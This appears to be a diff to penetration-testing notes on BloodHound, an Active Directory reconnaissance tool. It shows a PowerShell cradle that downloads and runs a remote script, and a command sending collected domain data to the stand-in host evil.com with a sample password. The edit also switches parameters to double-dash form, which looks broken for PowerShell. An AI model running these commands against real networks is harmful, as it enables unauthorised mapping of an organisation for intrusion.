@@ -33,14 +33,7 @@ Via download cradle (See https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 for more):
 
 ```powershell
-IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1")
-```
-
-Alternatively, from Empire:
-
-```bash
-$ curl -o data/BloodHound.ps1 https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1
-(Empire: AGENT) > scriptimport data/BloodHound.ps1
+IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1")
 ```
 
 #### Executing
@@ -48,13 +41,13 @@ $ curl -o data/BloodHound.ps1 https://raw.githubusercontent.com/BloodHoundAD/Blo
 Use the Neo4j REST API:
 
 ```powershell
-Invoke-BloodHound -URI 'https://evil.com:7473' -UserPass 'neo4j:Pa$$w0rd'
+Invoke-BloodHound --URI 'https://evil.com:7473' --UserPass 'neo4j:Pa$$w0rd'
 ```
 
 Create CSVs to later be uploaded:
 
 ```powershell
-Invoke-BloodHound -CSVFolder 'C:\Temp'
+Invoke-BloodHound --CSVFolder 'C:\Temp'
 ```
 
 
